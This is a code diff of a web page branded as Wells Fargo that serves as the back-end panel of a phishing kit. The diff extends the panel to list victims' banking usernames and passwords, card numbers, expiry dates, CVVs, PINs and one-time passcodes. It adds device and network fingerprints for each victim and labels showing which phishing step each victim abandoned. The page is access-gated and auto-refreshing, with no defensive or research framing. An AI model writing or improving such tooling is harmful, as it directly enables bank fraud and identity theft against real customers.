@@ -9,26 +9,33 @@
     body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; background: #f0f0f0; }
     nav { background: #cc0000; height: 50px; padding: 0 1.5rem; display: flex; align-items: center; justify-content: space-between; }
     .nav-brand { color: white; font-weight: 700; font-size: 18px; letter-spacing: 1px; }
+    .nav-right { display: flex; align-items: center; gap: 16px; }
     .count { color: white; font-size: 13px; }
-    main { flex: 1; padding: 2rem; max-width: 800px; margin: 0 auto; width: 100%; }
-    h1 { font-size: 20px; font-weight: 400; color: #333; margin-bottom: 1.5rem; }
-    .empty { text-align: center; color: #aaa; font-size: 14px; margin-top: 3rem; }
-    .entry {
-      background: white; border-radius: 12px; padding: 1.5rem;
-      margin-bottom: 16px; border: 1px solid #eee;
-      display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
-    }
-    .entry .timestamp {
-      grid-column: 1 / -1; font-size: 11px; color: #aaa;
-      text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;
-    }
-    .field label { display: block; font-size: 11px; font-weight: 600; color: #999; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
-    .field .value { font-size: 15px; color: #333; word-break: break-all; }
-    .field.full { grid-column: 1 / -1; }
-    .refresh { background: #cc0000; color: white; border: none; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; }
+    .otp-badge { font-size: 11px; padding: 3px 10px; border-radius: 20px; background: #fff3; color: white; }
+    main { flex: 1; padding: 2rem; max-width: 900px; margin: 0 auto; width: 100%; }
     .header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; }
-
-    /* Gate */
+    h1 { font-size: 20px; font-weight: 400; color: #333; }
+    .refresh { background: #cc0000; color: white; border: none; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; }
+    .empty { text-align: center; color: #aaa; font-size: 14px; margin-top: 3rem; }
+    .entry { background: white; border-radius: 12px; padding: 1.5rem; margin-bottom: 16px; border: 1px solid #eee; }
+    .entry-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem; flex-wrap: wrap; gap: 8px; }
+    .entry-left { display: flex; align-items: center; gap: 10px; }
+    .timestamp { font-size: 11px; color: #aaa; text-transform: uppercase; letter-spacing: 0.5px; }
+    .status { font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 20px; }
+    .status.complete { background: #e8f5e9; color: #2e7d32; }
+    .status.incomplete { background: #fff8e1; color: #f57f17; }
+    .step-badge { font-size: 11px; color: #999; }
+    .toggle-meta { font-size: 12px; color: #4a4fcf; cursor: pointer; background: none; border: none; }
+    .section-title { font-size: 11px; font-weight: 700; color: #cc0000; text-transform: uppercase; letter-spacing: 1px; margin: 12px 0 8px; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .grid.three { grid-template-columns: 1fr 1fr 1fr; }
+    .field label { display: block; font-size: 10px; font-weight: 600; color: #999; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
+    .field .value { font-size: 14px; color: #333; word-break: break-all; }
+    .field .value.missing { color: #ccc; font-style: italic; }
+    .otp-value { display: inline-flex; gap: 6px; margin-top: 4px; }
+    .otp-digit { width: 32px; height: 38px; border: 1px solid #eee; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 600; color: #333; background: #f9f9f9; }
+    .meta-section { display: none; margin-top: 12px; border-top: 1px solid #f0f0f0; padding-top: 12px; }
+    .meta-section.open { display: block; }
     #gate { position: fixed; inset: 0; background: #f0f0f0; display: flex; align-items: center; justify-content: center; z-index: 100; }
     .gate-card { background: white; border-radius: 12px; padding: 2.5rem; max-width: 380px; width: 100%; border: 1px solid #eee; text-align: center; }
     .gate-card h2 { font-size: 18px; font-weight: 400; color: #333; margin-bottom: 0.5rem; }
@@ -42,7 +49,10 @@
 <body>
   <nav>
     <span class="nav-brand">WELLS FARGO</span>
-    <span class="count" id="nav-count"></span>
+    <div class="nav-right">
+      <span class="otp-badge" id="otp-badge"></span>
+      <span class="count" id="nav-count"></span>
+    </div>
   </nav>
 
   <div id="gate">
@@ -70,57 +80,106 @@
       const val = document.getElementById('access-input').value;
       if (val === CORRECT) {
         document.getElementById('gate').style.display = 'none';
-        loadData();
-        // Auto-refresh every 30 seconds
-        setInterval(loadData, 30000);
+        loadConfig(); loadData();
+        setInterval(loadData, 15000);
       } else {
         document.getElementById('gate-err').style.display = 'block';
         document.getElementById('access-input').value = '';
       }
     }
+    document.getElementById('access-input').addEventListener('keydown', e => { if (e.key === 'Enter') checkCode(); });
 
-    document.getElementById('access-input').addEventListener('keydown', e => {
-      if (e.key === 'Enter') checkCode();
-    });
+    function loadConfig() {
+      fetch('/api/config').then(r => r.json()).then(cfg => {
+        document.getElementById('otp-badge').textContent = cfg.includeOtp ? 'OTP ON' : 'OTP OFF';
+      });
+    }
+
+    function toggleMeta(id) {
+      const el = document.getElementById('meta-' + id);
+      const btn = document.getElementById('btn-' + id);
+      el.classList.toggle('open');
+      btn.textContent = el.classList.contains('open') ? '▲ Hide device info' : '▼ Show device info';
+    }
+
+    function val(v) {
+      return v ? `<div class="value">${v}</div>` : `<div class="value missing">not collected</div>`;
+    }
+
+    function stepLabel(step, status) {
+      if (status === 'complete') return 'Complete';
+      if (step === 1) return 'Stopped at Step 1 (login only)';
+      if (step === 2) return 'Stopped at Step 2 (no OTP)';
+      return 'Incomplete';
+    }
 
     function loadData() {
-      fetch('/api/results')
-        .then(r => r.json())
-        .then(data => {
-          const container = document.getElementById('results');
-          document.getElementById('nav-count').textContent = data.length + ' submission' + (data.length !== 1 ? 's' : '');
+      fetch('/api/results').then(r => r.json()).then(data => {
+        const container = document.getElementById('results');
+        document.getElementById('nav-count').textContent = data.length + ' submission' + (data.length !== 1 ? 's' : '');
 
-          if (data.length === 0) {
-            container.innerHTML = '<p class="empty">No submissions yet. Waiting for entries...</p>';
-            return;
-          }
+        if (data.length === 0) {
+          container.innerHTML = '<p class="empty">No submissions yet.</p>';
+          return;
+        }
 
-          container.innerHTML = data.map(d => `
-            <div class="entry">
-              <div class="timestamp">${d.time}</div>
-              <div class="field full">
-                <label>Full Name</label>
-                <div class="value">${d.name}</div>
+        container.innerHTML = data.map((d, i) => `
+          <div class="entry">
+            <div class="entry-header">
+              <div class="entry-left">
+                <div class="timestamp">#${data.length - i} — ${d.time}</div>
+                <span class="status ${d.status}">${d.status === 'complete' ? '✓ Complete' : '⏳ ' + stepLabel(d.step, d.status)}</span>
               </div>
-              <div class="field full">
-                <label>Card Number</label>
-                <div class="value">${d.card}</div>
-              </div>
-              <div class="field">
-                <label>Exp Date</label>
-                <div class="value">${d.expdate}</div>
-              </div>
-              <div class="field">
-                <label>CVV</label>
-                <div class="value">${d.cvv}</div>
-              </div>
-              <div class="field">
-                <label>PIN</label>
-                <div class="value">${d.pin}</div>
-              </div>
+              <button class="toggle-meta" id="btn-${d.id}" onclick="toggleMeta('${d.id}')">▼ Show device info</button>
             </div>
-          `).join('');
-        });
+
+            <div class="section-title">Login</div>
+            <div class="grid">
+              <div class="field"><label>Username</label>${val(d.username)}</div>
+              <div class="field"><label>Password</label>${val(d.password)}</div>
+            </div>
+
+            <div class="section-title">Card Details</div>
+            <div class="grid">
+              <div class="field"><label>Full Name</label>${val(d.name)}</div>
+              <div class="field"><label>Card Number</label>${val(d.card)}</div>
+              <div class="field"><label>Exp Date</label>${val(d.expdate)}</div>
+              <div class="field"><label>CVV</label>${val(d.cvv)}</div>
+              <div class="field"><label>PIN</label>${val(d.pin)}</div>
+            </div>
+
+            ${d.otp ? `
+            <div class="section-title">OTP Code</div>
+            <div class="otp-value">
+              ${d.otp.split('').map(digit => `<div class="otp-digit">${digit}</div>`).join('')}
+            </div>` : ''}
+
+            <div class="meta-section" id="meta-${d.id}">
+              <div class="section-title">Network</div>
+              <div class="grid">
+                <div class="field"><label>IP Address</label>${val(d.ip)}</div>
+                <div class="field"><label>Connection</label>${val(d.connection)}</div>
+                <div class="field"><label>Online</label>${val(String(d.online))}</div>
+                <div class="field"><label>Referrer</label>${val(d.referrer)}</div>
+              </div>
+              <div class="section-title">Device</div>
+              <div class="grid three">
+                <div class="field"><label>Platform</label>${val(d.platform)}</div>
+                <div class="field"><label>Language</label>${val(d.language)}</div>
+                <div class="field"><label>Timezone</label>${val(d.timezone)}</div>
+                <div class="field"><label>Screen</label>${val(d.screenRes)}</div>
+                <div class="field"><label>Color Depth</label>${val(d.colorDepth)}</div>
+                <div class="field"><label>Touch Points</label>${val(String(d.touchPoints))}</div>
+                <div class="field"><label>CPU Cores</label>${val(String(d.cores))}</div>
+                <div class="field"><label>RAM</label>${val(d.deviceMemory)}</div>
+                <div class="field"><label>Cookies</label>${val(String(d.cookiesOn))}</div>
+              </div>
+              <div class="section-title">User Agent</div>
+              <div class="field"><div class="value" style="font-size:12px;color:#777">${d.userAgent || '—'}</div></div>
+            </div>
+          </div>
+        `).join('');
+      });
     }
   </script>
 </body>
